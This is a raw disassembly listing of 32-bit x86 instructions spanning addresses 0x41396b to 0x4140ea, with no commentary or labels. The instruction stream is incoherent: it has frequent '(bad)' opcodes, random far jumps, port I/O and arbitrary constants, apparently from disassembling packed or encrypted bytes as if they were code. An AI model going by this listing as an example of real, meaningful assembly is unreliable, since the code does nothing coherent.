  41396b:	imul   edx,eax,0xffffffc5
  41396e:	iret   
  41396f:	mov    dl,0x5f
  413971:	retf   0xb80d
  413974:	in     al,0xa1
  413976:	not    DWORD PTR [esi-0x3f191980]
  41397c:	push   ebp
  41397d:	mov    eax,ds:0x32af8957
  413982:	and    al,0x27
  413984:	or     eax,eax
  413986:	cld    
  413987:	mov    ebp,0x3a67398a
  41398c:	stc    
  41398d:	ja     0x41391f
  41398f:	and    DWORD PTR ds:0x79df7208,ebp
  413995:	and    al,0x5e
  413997:	(bad)  
  413998:	hlt    
  413999:	dec    eax
  41399a:	push   esp
  41399b:	retf   
  41399c:	jo     0x41398e
  41399e:	pop    ebp
  41399f:	imul   DWORD PTR [ebp+0x6e1319c2]
  4139a5:	mov    ecx,0x97cf309d
  4139aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139ab:	xchg   edi,eax
  4139ac:	aaa    
  4139ad:	sub    eax,0x1200f43e
  4139b2:	stos   DWORD PTR es:[edi],eax
  4139b3:	xchg   bh,dl
  4139b5:	out    dx,eax
  4139b6:	aad    0x57
  4139b8:	cs out 0xae,eax
  4139bb:	xlat   BYTE PTR ds:[ebx]
  4139bc:	int3   
  4139bd:	pop    edi
  4139be:	fs inc ecx
  4139c0:	add    ebx,DWORD PTR [ecx+eiz*8-0x28]
  4139c4:	leave  
  4139c5:	pop    edx
  4139c6:	(bad)  
  4139c7:	push   ebx
  4139c8:	sub    ebx,edi
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	dec    ecx
  4139cc:	(bad)  
  4139cd:	push   ss
  4139ce:	fisubr WORD PTR [edx+ebp*8-0x2e5680a2]
  4139d5:	lods   eax,DWORD PTR ds:[esi]
  4139d6:	inc    ebp
  4139d7:	fwait
  4139d8:	arpl   WORD PTR [eax],bp
  4139da:	mov    bh,0x6d
  4139dc:	icebp  
  4139dd:	sub    DWORD PTR [esi],edi
  4139df:	xor    BYTE PTR [ecx],cl
  4139e1:	pushf  
  4139e2:	neg    BYTE PTR [ecx+0x5f]
  4139e5:	lock cmp DWORD PTR [eax],ebx
  4139e8:	mov    cl,0x6c
  4139ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139eb:	retf   
  4139ec:	test   BYTE PTR [edx],dh
  4139ee:	js     0x413981
  4139f0:	dec    esi
  4139f1:	clc    
  4139f2:	data16 jo 0x413987
  4139f5:	(bad)  
  4139f6:	xchg   ebx,eax
  4139f7:	stos   BYTE PTR es:[edi],al
  4139f8:	out    0x46,eax
  4139fa:	xor    eax,0xf0176d26
  4139ff:	popa   
  413a00:	mov    bh,0xe0
  413a02:	fucom  st(2)
  413a04:	sar    bh,1
  413a06:	js     0x413a27
  413a08:	mov    bl,BYTE PTR [edx]
  413a0a:	retf   
  413a0b:	pop    ss
  413a0c:	int    0x37
  413a0e:	shl    BYTE PTR [eax-0x7],0x5
  413a12:	and    esi,DWORD PTR [ecx+0x2b]
  413a15:	shr    DWORD PTR [ecx-0x17fe883d],1
  413a1b:	dec    esp
  413a1c:	mov    ecx,0x52e20ea1
  413a21:	xor    ebp,DWORD PTR [edx-0x5a]
  413a24:	cs cmp dh,ch
  413a27:	pop    edx
  413a28:	ins    BYTE PTR es:[edi],dx
  413a29:	mov    edi,0x6ecf4769
  413a2e:	jmp    0x3c83d89c
  413a33:	ins    DWORD PTR es:[edi],dx
  413a34:	xchg   ebx,eax
  413a35:	add    eax,0x81da969b
  413a3a:	push   eax
  413a3b:	mov    WORD PTR [ecx],ds
  413a3d:	jno    0x413a89
  413a3f:	jmp    FWORD PTR [edi-0x63db8228]
  413a45:	mov    esp,0x3b768b12
  413a4a:	dec    cl
  413a4c:	cmp    ebp,DWORD PTR [ecx-0x33]
  413a4f:	std    
  413a50:	dec    esi
  413a51:	ret    0x72dd
  413a54:	mov    dh,0x23
  413a56:	retf   
  413a57:	push   0x6d86c943
  413a5c:	retf   0xfa6f
  413a5f:	adc    BYTE PTR cs:[ebx-0x47d2d3d3],dl
  413a66:	and    DWORD PTR [ebp-0x1b],0xa0f8fda1
  413a6d:	loop   0x413aae
  413a6f:	fdiv   QWORD PTR ds:0x45421f1f
  413a75:	rcl    BYTE PTR [ebp-0x12],cl
  413a78:	js     0x413aa3
  413a7a:	test   BYTE PTR [edx+0x31],dl
  413a7d:	xchg   esi,eax
  413a7e:	ss iret 
  413a80:	jno    0x413a11
  413a82:	adc    ch,ch
  413a84:	fbstp  TBYTE PTR [edi+0x142ee9c6]
  413a8a:	jnp    0x413a33
  413a8c:	fild   WORD PTR [edx-0x2583a77d]
  413a92:	push   eax
  413a93:	sbb    ebp,DWORD PTR [ebx+esi*4]
  413a96:	dec    ebx
  413a97:	and    bl,BYTE PTR [ebx+0x1d]
  413a9a:	xchg   ebp,eax
  413a9b:	and    ebx,DWORD PTR [ebx]
  413a9d:	cmp    eax,0xc3f15b9c
  413aa2:	and    bh,BYTE PTR [ebp+0x5e]
  413aa5:	jl     0x413afe
  413aa7:	lods   eax,DWORD PTR ds:[esi]
  413aa8:	ins    DWORD PTR es:[edi],dx
  413aa9:	int3   
  413aaa:	mov    al,0x6e
  413aac:	jbe    0x413aac
  413aae:	cld    
  413aaf:	mov    ecx,0xa4022830
  413ab4:	add    al,0xba
  413ab6:	push   esi
  413ab7:	xchg   edx,eax
  413ab8:	data16 mov al,ds:0xe13828fb
  413abe:	fld    DWORD PTR [esi]
  413ac0:	pop    ss
  413ac1:	xchg   bh,dl
  413ac3:	mov    esp,0xd2a4bf1f
  413ac8:	test   al,0xd0
  413aca:	mov    WORD PTR [ebx+ebx*4-0x548d9e5e],?
  413ad1:	mov    eax,0x5b7b298
  413ad6:	das    
  413ad7:	out    dx,eax
  413ad8:	jmp    0xfcba:0x780f34e1
  413adf:	xor    dh,dh
  413ae1:	dec    ecx
  413ae2:	in     al,0x18
  413ae4:	scas   eax,DWORD PTR es:[edi]
  413ae5:	push   0xeaa4fb3e
  413aea:	push   ds
  413aeb:	jecxz  0x413b3b
  413aed:	mov    WORD PTR [esi+0x12061b56],gs
  413af3:	fs aam 0x2f
  413af6:	sbb    DWORD PTR [ebp-0x70],ebp
  413af9:	inc    edi
  413afa:	push   ebp
  413afb:	stos   DWORD PTR es:[edi],eax
  413afc:	mov    ch,0xf7
  413afe:	sbb    DWORD PTR [eax],esi
  413b00:	scas   eax,DWORD PTR es:[edi]
  413b01:	mov    dh,BYTE PTR [ebx]
  413b03:	sub    eax,0xe99fa272
  413b08:	mov    al,0xbe
  413b0a:	cmc    
  413b0b:	cs pop es
  413b0d:	xor    BYTE PTR [edi-0x4f],ah
  413b10:	adc    ebp,0x47
  413b13:	sub    al,0xe0
  413b15:	push   ss
  413b16:	push   es
  413b17:	data16 shl dl,0xb
  413b1b:	jb     0x413b94
  413b1d:	jno    0x413b18
  413b1f:	mov    edx,0x2cf8e216
  413b24:	cmp    ch,0xb5
  413b27:	fnstsw WORD PTR [edi+0x3f]
  413b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b2b:	jo     0x413b7f
  413b2d:	inc    ebp
  413b2e:	dec    ebp
  413b2f:	or     ah,BYTE PTR [esi+eax*2]
  413b32:	imul   BYTE PTR [edx]
  413b34:	xor    eax,0xeecdecf8
  413b39:	jae    0x413b46
  413b3b:	iret   
  413b3c:	xchg   eax,edi
  413b3e:	scas   eax,DWORD PTR es:[edi]
  413b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b40:	sub    bl,bl
  413b42:	aad    0x1
  413b44:	out    dx,eax
  413b45:	mov    edx,0x3eb769e3
  413b4a:	mov    ebx,0x463e383d
  413b4f:	adc    DWORD PTR [edx],esp
  413b51:	aaa    
  413b52:	pop    edi
  413b53:	xchg   ebp,eax
  413b54:	loop   0x413b77
  413b56:	xlat   BYTE PTR ds:[ebx]
  413b57:	pop    ss
  413b58:	xchg   ebp,eax
  413b59:	fidiv  WORD PTR [edx-0x21]
  413b5c:	int3   
  413b5d:	jns    0x413bc5
  413b5f:	jbe    0x413bab
  413b61:	mov    dh,BYTE PTR [esi]
  413b63:	(bad)  
  413b64:	retf   
  413b65:	sbb    BYTE PTR [edx-0x568d9ef7],0xce
  413b6c:	enter  0x8859,0xf7
  413b70:	xchg   ecx,eax
  413b71:	sar    BYTE PTR [edi+0x20],0xed
  413b75:	aaa    
  413b76:	xor    BYTE PTR [eax-0x162254d0],ch
  413b7c:	push   esp
  413b7d:	arpl   WORD PTR [eax+ecx*4],si
  413b80:	fadd   DWORD PTR [ebx+0x1e]
  413b83:	out    dx,eax
  413b84:	or     BYTE PTR ss:[edi],dh
  413b87:	ss push eax
  413b89:	jg     0x413b0c
  413b8b:	cmp    eax,0x97c75daf
  413b90:	pop    esi
  413b91:	and    eax,DWORD PTR [ebx]
  413b93:	imul   ecx,DWORD PTR [esi+0x43],0xfffffff8
  413b97:	sbb    eax,0x14667b08
  413b9c:	and    BYTE PTR [eax-0x47],dh
  413b9f:	and    eax,0x4ce7539
  413ba4:	clc    
  413ba5:	or     DWORD PTR [ecx+0x2d],ebx
  413ba8:	jmp    ebp
  413baa:	imul   esi,DWORD PTR [edx+0x2e52e851],0x849c523d
  413bb4:	jb     0x413bfd
  413bb6:	push   ecx
  413bb7:	bound  ebp,QWORD PTR [edx]
  413bb9:	pop    ebx
  413bba:	jnp    0x413b4c
  413bbc:	pop    ebp
  413bbd:	or     dh,BYTE PTR [edi-0x3d9589b6]
  413bc3:	xor    al,0xbe
  413bc5:	popa   
  413bc6:	mov    ch,0xc9
  413bc8:	sub    DWORD PTR [eax+edi*2],ebp
  413bcb:	cld    
  413bcc:	dec    ebp
  413bcd:	inc    esi
  413bce:	gs mov edi,0xcba2c449
  413bd4:	xchg   cl,ch
  413bd6:	xchg   edx,eax
  413bd7:	jg     0x413bd4
  413bd9:	scas   al,BYTE PTR es:[edi]
  413bda:	fistp  DWORD PTR [edx-0x6c]
  413bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bde:	push   ds
  413bdf:	jge    0x413c5a
  413be1:	pop    ebp
  413be2:	push   ss
  413be3:	cmp    al,0xf3
  413be5:	add    eax,0x672e20e1
  413bea:	jo     0x413baf
  413bec:	xor    al,0x91
  413bee:	sahf   
  413bef:	pop    eax
  413bf0:	pop    es
  413bf1:	add    al,0x87
  413bf3:	cmp    BYTE PTR [ebp+0x52292576],bh
  413bf9:	cs out 0x88,eax
  413bfc:	sbb    edx,DWORD PTR cs:[edi]
  413bff:	and    BYTE PTR [eax+0x642c282a],dl
  413c05:	icebp  
  413c06:	popa   
  413c07:	add    ebx,edx
  413c09:	nop
  413c0a:	jge    0x413c4b
  413c0c:	jb     0x413c23
  413c0e:	cmp    eax,0xf5e396f0
  413c13:	lahf   
  413c14:	(bad)  
  413c16:	sub    DWORD PTR [eax+0x55ed532f],edi
  413c1c:	out    dx,al
  413c1d:	sub    eax,0x2ed13c3b
  413c22:	adc    eax,0x536470e6
  413c27:	scas   eax,DWORD PTR es:[edi]
  413c28:	jecxz  0x413bc5
  413c2a:	or     al,0xae
  413c2c:	ins    BYTE PTR es:[edi],dx
  413c2d:	fisttp DWORD PTR [ebp-0x68c86c26]
  413c33:	ja     0x413bd8
  413c35:	or     DWORD PTR [edx+0x2e],ecx
  413c38:	sbb    al,0x5b
  413c3a:	pop    edi
  413c3b:	js     0x413c86
  413c3d:	sub    bl,BYTE PTR [edi+0x2a]
  413c40:	adc    DWORD PTR [esi+0x72a9455d],0xffffffc6
  413c47:	adc    al,0x8d
  413c49:	stos   DWORD PTR es:[edi],eax
  413c4a:	jl     0x413c1d
  413c4c:	mov    dl,0xa
  413c4e:	sti    
  413c4f:	mov    al,ds:0x1d0cdd58
  413c54:	mov    esi,0xe11bdf7
  413c59:	push   cs
  413c5a:	(bad)  
  413c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c5c:	and    al,0xbb
  413c5e:	pop    eax
  413c5f:	jo     0x413c4b
  413c61:	out    0x99,eax
  413c63:	out    dx,al
  413c64:	add    edx,DWORD PTR [eax]
  413c66:	data16 mov BYTE PTR [ecx+eiz*1],ah
  413c6a:	and    al,0x5e
  413c6c:	js     0x413c10
  413c6e:	(bad)  
  413c6f:	pop    ebp
  413c70:	add    al,0xb3
  413c72:	jne    0x413c60
  413c74:	retf   
  413c75:	push   esi
  413c76:	daa    
  413c77:	lahf   
  413c78:	adc    DWORD PTR [ebx-0xd4d0509],ebx
  413c7e:	push   esp
  413c7f:	call   0xf5c468fd
  413c84:	dec    edx
  413c85:	xor    ah,bh
  413c87:	test   DWORD PTR [eax+0x7f3522a4],esp
  413c8d:	ins    BYTE PTR es:[edi],dx
  413c8e:	ja     0x413ce8
  413c90:	leave  
  413c91:	(bad)  
  413c93:	pop    ebx
  413c94:	mov    edx,0x699ed9fe
  413c99:	push   ebx
  413c9a:	push   cs
  413c9b:	adc    eax,0x942d5d3
  413ca0:	jae    0x413cc7
  413ca2:	add    esp,DWORD PTR [ecx+ebx*1]
  413ca5:	or     eax,0xd5145fcc
  413caa:	gs dec eax
  413cac:	cdq    
  413cad:	cli    
  413cae:	test   al,0xe7
  413cb0:	mov    WORD PTR [eax],es
  413cb2:	xor    DWORD PTR fs:[edx+eax*1],ebp
  413cb6:	pushf  
  413cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb8:	data16 jae 0x413d02
  413cbb:	push   edi
  413cbc:	imul   DWORD PTR [esi]
  413cbe:	in     eax,dx
  413cbf:	push   cs
  413cc0:	adc    al,0xa9
  413cc2:	xchg   esi,eax
  413cc3:	mov    WORD PTR [eax+esi*1+0x5b],gs
  413cc7:	mov    esi,0x3bdbc3f0
  413ccc:	arpl   WORD PTR ds:0x79751eec,dx
  413cd2:	in     eax,0xad
  413cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cd5:	xor    edx,DWORD PTR [edi+0x10]
  413cd8:	adc    edx,DWORD PTR [ebx-0x60]
  413cdb:	sub    BYTE PTR [edx+ebx*8-0x70],al
  413cdf:	sub    esi,DWORD PTR [esi]
  413ce1:	jecxz  0x413d37
  413ce3:	push   edx
  413ce4:	adc    ebp,DWORD PTR [edi]
  413ce6:	pop    ebx
  413ce7:	repnz loop 0x413d59
  413cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ceb:	mov    esp,DWORD PTR [ebp+0x523bbddc]
  413cf1:	mov    BYTE PTR [eax+0x5592b5ac],al
  413cf7:	mov    edi,0x2c36eec
  413cfc:	jmp    0x413d65
  413cfe:	dec    bl
  413d00:	into   
  413d01:	mov    ss,WORD PTR [ebx-0x59dcc2a0]
  413d07:	cs inc edx
  413d09:	sbb    esp,edi
  413d0b:	jbe    0x413d5d
  413d0d:	mov    al,0x3f
  413d0f:	ret    0x3797
  413d12:	in     al,dx
  413d13:	das    
  413d14:	mov    gs,WORD PTR [edi+0x73]
  413d17:	inc    ebx
  413d18:	xchg   ebp,eax
  413d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d1a:	mov    bh,0xa7
  413d1c:	fsubr  st,st(1)
  413d1e:	add    BYTE PTR [esi-0x542f5cc8],0x77
  413d25:	into   
  413d26:	scas   al,BYTE PTR es:[edi]
  413d27:	push   esi
  413d28:	sbb    ch,ah
  413d2a:	(bad)  
  413d2b:	int3   
  413d2c:	aaa    
  413d2d:	fdiv   DWORD PTR [eax-0x7c]
  413d30:	out    0xec,al
  413d32:	out    0x10,al
  413d34:	xor    bl,bl
  413d36:	and    ecx,edi
  413d38:	enter  0x2c3e,0x70
  413d3c:	sub    cl,BYTE PTR [eax+esi*4-0x16]
  413d40:	call   0xe8b40153
  413d45:	jbe    0x413d3c
  413d47:	push   cs
  413d48:	test   al,0x63
  413d4a:	fidivr WORD PTR [edx-0x68ff46d]
  413d50:	mov    ch,0x12
  413d52:	imul   eax,DWORD PTR [eax],0x67
  413d55:	xchg   ebp,eax
  413d56:	adc    eax,0xa0778ef8
  413d5b:	adc    eax,0xe2bbcdea
  413d60:	sub    edx,DWORD PTR [esi-0x579f248]
  413d66:	shl    ch,cl
  413d68:	sar    cl,0x3b
  413d6b:	je     0x413d03
  413d6d:	int    0xbe
  413d6f:	push   0xffffffee
  413d71:	inc    ebp
  413d72:	js     0x413dcf
  413d74:	mov    ebp,0x8d299366
  413d79:	fs mov edx,0x1e22796f
  413d7f:	(bad)  
  413d80:	(bad)  
  413d81:	idiv   DWORD PTR [eax]
  413d83:	or     DWORD PTR [edi-0x14bc4fe9],ecx
  413d89:	imul   edi,ecx,0x74b38781
  413d8f:	stc    
  413d90:	jno    0x413df7
  413d92:	adc    eax,0x8cd119aa
  413d97:	pop    ebp
  413d98:	sbb    al,0x5e
  413d9a:	xchg   edx,eax
  413d9b:	sub    al,cl
  413d9d:	(bad)  
  413d9e:	jo     0x413d95
  413da0:	mov    dh,dh
  413da2:	push   ds
  413da3:	ret    0x355d
  413da6:	int    0x3d
  413da8:	mov    dl,0x9c
  413daa:	dec    edx
  413dab:	jnp    0x413dd8
  413dad:	arpl   ax,bp
  413daf:	pop    ebx
  413db0:	iret   
  413db1:	push   esp
  413db2:	add    eax,0xfb0f83f1
  413db7:	pushf  
  413db8:	inc    ecx
  413db9:	xchg   esp,eax
  413dba:	lock icebp 
  413dbc:	jbe    0x413dc6
  413dbe:	fs sti 
  413dc0:	mov    al,ds:0xc6286f8
  413dc5:	sub    DWORD PTR [ebx+ebx*8-0x23f52aaf],esp
  413dcc:	jge    0x413d6f
  413dce:	cld    
  413dcf:	loop   0x413d84
  413dd1:	aas    
  413dd2:	dec    esp
  413dd3:	inc    ebp
  413dd4:	xor    esp,DWORD PTR gs:[ecx+0x32e3001f]
  413ddb:	mov    eax,DWORD PTR [ebp-0x78]
  413dde:	or     BYTE PTR [ebx+0x4a],0x26
  413de2:	hlt    
  413de3:	push   ds
  413de4:	dec    esi
  413de5:	mov    ebp,0x9f457931
  413dea:	pop    ds
  413deb:	sbb    BYTE PTR [ecx-0x33],dl
  413dee:	test   al,0x14
  413df0:	arpl   WORD PTR [esi+0x4c],sp
  413df3:	jecxz  0x413e27
  413df5:	pusha  
  413df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413df7:	or     esi,ebp
  413df9:	cwde   
  413dfa:	inc    esi
  413dfb:	lahf   
  413dfc:	push   0xffffff84
  413dfe:	je     0x413e64
  413e00:	sbb    BYTE PTR [ecx],cl
  413e02:	jle    0x413d9e
  413e04:	dec    esi
  413e05:	push   cs
  413e06:	test   al,0x30
  413e08:	clc    
  413e09:	ficom  DWORD PTR [edi-0x6a]
  413e0c:	ret    0xa522
  413e0f:	dec    ecx
  413e10:	inc    eax
  413e11:	push   0x2d
  413e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e14:	pushf  
  413e15:	data16 out 0x25,al
  413e18:	xor    ebp,esi
  413e1a:	out    dx,al
  413e1b:	jne    0x413dfc
  413e1d:	pop    esp
  413e1e:	inc    eax
  413e1f:	dec    ebx
  413e20:	rcr    DWORD PTR [ebx+0x8],0x71
  413e24:	lea    esi,[esi-0x418dcf4b]
  413e2a:	mov    bh,0x5e
  413e2c:	cmp    al,0xaf
  413e2e:	xchg   edx,eax
  413e2f:	pushf  
  413e30:	cmp    dh,0x56
  413e33:	loope  0x413dbe
  413e35:	dec    ecx
  413e36:	jmp    0x956790aa
  413e3b:	aaa    
  413e3c:	ins    DWORD PTR es:[edi],dx
  413e3d:	inc    edi
  413e3e:	jno    0x413dea
  413e40:	or     eax,0x20dc2ffe
  413e45:	xor    ebx,DWORD PTR [edx-0x74]
  413e48:	ret    0x9b9d
  413e4b:	jb     0x413dce
  413e4d:	ja     0x1cdd15b
  413e53:	xchg   ecx,eax
  413e54:	inc    esp
  413e55:	mov    esi,0x8dbeb023
  413e5a:	nop
  413e5b:	push   ecx
  413e5c:	xchg   esp,eax
  413e5d:	sub    ebp,DWORD PTR [eax]
  413e5f:	cmc    
  413e60:	jle    0x413e71
  413e62:	imul   ebx,DWORD PTR [esi-0x34695990],0x743caba8
  413e6c:	mov    eax,0x8bc35674
  413e71:	ret    
  413e72:	pop    edi
  413e73:	pop    es
  413e74:	and    ebp,DWORD PTR [ebx+0x49fa5fcd]
  413e7a:	mov    ds:0x329d3abf,al
  413e7f:	mov    edi,DWORD PTR [edx+0x54]
  413e82:	data16 add ah,bl
  413e85:	jb     0x413ee6
  413e87:	jnp    0x413e6d
  413e89:	retf   0x3895
  413e8c:	pop    es
  413e8d:	inc    esi
  413e8e:	shr    BYTE PTR es:[eax*8-0x7932e0f6],1
  413e96:	push   ebp
  413e97:	sub    bh,dl
  413e99:	inc    eax
  413e9a:	retf   0x4bf1
  413e9d:	retf   
  413e9e:	clc    
  413e9f:	in     eax,0x7a
  413ea1:	push   0xc465bff6
  413ea6:	adc    esp,DWORD PTR [ecx-0x5346aca2]
  413eac:	mov    es:0x2e3876da,al
  413eb2:	mov    eax,0xc8bc4c90
  413eb7:	fiadd  DWORD PTR [ebp+0x29]
  413eba:	sbb    DWORD PTR [edx-0x78062e51],esp
  413ec0:	xor    al,0x2f
  413ec2:	mov    al,ds:0x49af79fc
  413ec7:	addr16 out dx,al
  413ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eca:	into   
  413ecb:	mov    al,BYTE PTR [esi+ebp*1]
  413ece:	jae    0x413f20
  413ed0:	sbb    DWORD PTR ds:0x1a985e3a,esi
  413ed6:	inc    ebp
  413ed7:	cmp    DWORD PTR [edi+0x2f],edx
  413eda:	or     cl,BYTE PTR ds:0x4253c4a5
  413ee0:	cmp    ch,BYTE PTR [ecx+0x7d4997cb]
  413ee6:	cmp    esp,edx
  413ee8:	cmp    bl,ch
  413eea:	and    BYTE PTR [eax+0x33],0x7e
  413eee:	pop    ebp
  413eef:	add    BYTE PTR [ecx],0x1
  413ef2:	mov    ds:0x517b2b3c,al
  413ef7:	(bad)  
  413ef8:	popf   
  413ef9:	inc    ebx
  413efa:	jp     0x413f13
  413efc:	push   0x13
  413efe:	inc    edi
  413eff:	push   0x2e2ba5ac
  413f04:	mov    cl,0xe9
  413f06:	jbe    0x413f2c
  413f08:	clc    
  413f09:	dec    edi
  413f0a:	nop
  413f0b:	es fisubr DWORD PTR fs:[ebp-0x59fa8ea4]
  413f13:	idiv   dh
  413f15:	xor    dl,ch
  413f17:	mov    eax,0x96260ee6
  413f1c:	push   edi
  413f1d:	sbb    al,0xa9
  413f1f:	pop    dx
  413f21:	lods   eax,DWORD PTR ds:[esi]
  413f22:	xchg   esp,esp
  413f24:	scas   al,BYTE PTR es:[edi]
  413f25:	int3   
  413f26:	frstor [edi-0x45]
  413f29:	mov    edx,0xc8e787f3
  413f2e:	mov    ch,0x3f
  413f30:	xor    BYTE PTR [esi],al
  413f32:	aad    0xe4
  413f34:	adc    al,0xd2
  413f36:	mov    cl,0x5
  413f38:	clc    
  413f39:	(bad)  
  413f3a:	sub    DWORD PTR [edi+0x6b],ebp
  413f3d:	add    edx,edx
  413f3f:	sub    cl,BYTE PTR [edi]
  413f41:	cmp    al,0x7c
  413f43:	or     dh,bh
  413f45:	mov    ecx,0xab98044c
  413f4a:	adc    DWORD PTR [esi],0xffffff9d
  413f4d:	call   0xef88:0xbf244ae0
  413f54:	add    ecx,DWORD PTR [ecx+0x63]
  413f57:	pop    edi
  413f58:	add    bl,BYTE PTR [eax+0x2a6fc5cb]
  413f5e:	fsubr  st,st(2)
  413f60:	das    
  413f61:	sbb    DWORD PTR [edx+0x17],edi
  413f64:	xchg   ebx,eax
  413f65:	cmp    al,0x13
  413f67:	jecxz  0x413f38
  413f69:	sub    eax,0xd36f6674
  413f6e:	mov    WORD PTR [eax],cs
  413f70:	sahf   
  413f71:	fisub  WORD PTR ds:0xba1e6325
  413f77:	push   ecx
  413f78:	and    dl,BYTE PTR [ebp-0x3b]
  413f7b:	(bad)  
  413f7c:	rcr    BYTE PTR [edi+eiz*2],cl
  413f7f:	mov    ebx,0x587c2b09
  413f84:	sub    ah,BYTE PTR cs:0x5bb9ecf3
  413f8b:	xchg   ecx,eax
  413f8c:	out    dx,eax
  413f8d:	lods   eax,DWORD PTR gs:[esi]
  413f8f:	out    0x8e,eax
  413f91:	push   cs
  413f92:	mov    BYTE PTR [eax],al
  413f94:	mov    eax,ds:0x85cdaebd
  413f99:	outs   dx,DWORD PTR gs:[esi]
  413f9b:	mov    esi,DWORD PTR [edx+0x3d]
  413f9e:	xchg   ebx,eax
  413f9f:	xchg   ebp,eax
  413fa0:	mov    cl,0x92
  413fa2:	add    al,0xe0
  413fa4:	icebp  
  413fa5:	cmp    bh,0x82
  413fa8:	jmp    0x413f5d
  413faa:	ss or  al,0xce
  413fad:	mov    edi,0x3ef10ac7
  413fb2:	fwait
  413fb3:	rol    BYTE PTR [esi+0x43],cl
  413fb6:	pop    es
  413fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb8:	cld    
  413fb9:	jmp    0x413f51
  413fbb:	jo     0x413f5c
  413fbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fbe:	jns    0x413f7e
  413fc0:	stos   DWORD PTR es:[edi],eax
  413fc1:	xchg   ecx,eax
  413fc2:	nop
  413fc3:	call   0x74f:0x6500c6
  413fca:	add    DWORD PTR [ebx+0x58],eax
  413fcd:	mov    esi,0xde0cb2b7
  413fd2:	and    al,0x71
  413fd4:	adc    al,0xc6
  413fd6:	mov    ch,BYTE PTR [edx]
  413fd8:	dec    ebx
  413fd9:	xor    eax,0xa185a3d8
  413fde:	pop    es
  413fdf:	pop    ebp
  413fe0:	aaa    
  413fe1:	and    al,0x4b
  413fe3:	jmp    0x414028
  413fe5:	cdq    
  413fe6:	adc    DWORD PTR [eax],ebp
  413fe8:	retf   
  413fe9:	sub    BYTE PTR [ecx+edx*8],ch
  413fec:	aas    
  413fed:	xlat   BYTE PTR ds:[ebx]
  413fee:	outs   dx,DWORD PTR ds:[esi]
  413fef:	jb     0x41400c
  413ff1:	xchg   ebp,eax
  413ff2:	pop    esi
  413ff3:	fstp   st(6)
  413ff5:	mov    bh,cl
  413ff7:	cmp    eax,0x63c8363d
  413ffc:	jmp    0x6b6c:0xd61027d5
  414003:	inc    edi
  414004:	popf   
  414005:	data16 sub dl,bh
  414008:	jo     0x414016
  41400a:	lds    esp,FWORD PTR [ebp+0x21]
  41400d:	je     0x414055
  41400f:	add    ebp,DWORD PTR [esi-0x79]
  414012:	and    ch,ah
  414014:	jns    0x414023
  414016:	inc    eax
  414017:	lods   al,BYTE PTR ds:[esi]
  414018:	adc    al,0xec
  41401a:	or     DWORD PTR [ecx+0x1b96bac7],esp
  414020:	mov    eax,ds:0xa720d831
  414025:	mov    eax,0xee547a9f
  41402a:	ja     0x41406f
  41402c:	dec    esi
  41402d:	cmp    BYTE PTR [edi-0x1d],ch
  414030:	mov    ebp,edx
  414032:	mov    esi,0x1b7a3aa2
  414037:	sbb    BYTE PTR [esi],0x56
  41403a:	inc    eax
  41403b:	div    bh
  41403d:	sbb    eax,0xdac2beed
  414042:	mov    bl,0xe4
  414044:	addr16 arpl bp,cx
  414047:	mov    al,BYTE PTR [eax+eiz*4-0x690f28d0]
  41404e:	pop    ebx
  41404f:	mov    bh,0x34
  414051:	add    bh,BYTE PTR [edi+eax*8+0x50]
  414055:	mov    ds:0xc2d8aa31,al
  41405a:	push   edi
  41405b:	lock or ebp,eax
  41405e:	loopne 0x41402b
  414060:	cmp    BYTE PTR [ecx-0x4b],0x2
  414064:	pop    eax
  414065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414066:	addr16 clc 
  414068:	mov    cl,0x6
  41406a:	jle    0x413ffd
  41406c:	mov    ebp,0x53aa0f50
  414071:	hlt    
  414072:	div    BYTE PTR [eax+0x6b4c5f8d]
  414078:	pop    ecx
  414079:	sub    al,0x9e
  41407b:	imul   ebp,DWORD PTR [edi-0x36502e76],0x68c7c4e6
  414085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414086:	call   0x5875:0xcde55415
  41408d:	adc    bh,BYTE PTR [edi+edx*1]
  414090:	push   edi
  414091:	sbb    eax,0x7423568e
  414096:	jmp    0x84fe:0x9016c011
  41409d:	cmp    BYTE PTR [edi],al
  41409f:	cli    
  4140a0:	addr16 sti 
  4140a2:	xor    al,0xbf
  4140a4:	(bad)  
  4140a5:	es inc esp
  4140a7:	stos   DWORD PTR es:[edi],eax
  4140a8:	mov    al,0x7e
  4140aa:	jle    0x4140c6
  4140ac:	inc    ebx
  4140ad:	sbb    BYTE PTR [edx],0xf3
  4140b0:	fs mov dl,0x7c
  4140b3:	ss loop 0x4140a1
  4140b6:	mov    WORD PTR [ebp+0x5aec88d1],fs
  4140bc:	add    DWORD PTR [edx+0x25],eax
  4140bf:	data16 rcr BYTE PTR [ebp-0x52],1
  4140c3:	mov    BYTE PTR [ecx+esi*4+0x20],ah
  4140c7:	push   esp
  4140c8:	xchg   ecx,eax
  4140c9:	push   es
  4140ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140cb:	ins    DWORD PTR es:[edi],dx
  4140cc:	out    0xa2,al
  4140ce:	je     0x414082
  4140d0:	inc    edi
  4140d1:	cmp    eax,0xca96f3f
  4140d6:	mov    BYTE PTR [edi],bl
  4140d8:	lds    ecx,FWORD PTR [esi+0x0]
  4140db:	sbb    edi,esp
  4140dd:	ja     0x414153
  4140df:	dec    esp
  4140e0:	fnsetpm(287 only) 
  4140e2:	adc    al,0x67
  4140e4:	fwait
  4140e5:	mov    edi,0x7141f1c8
  4140ea:	addr16 jne 0x414143
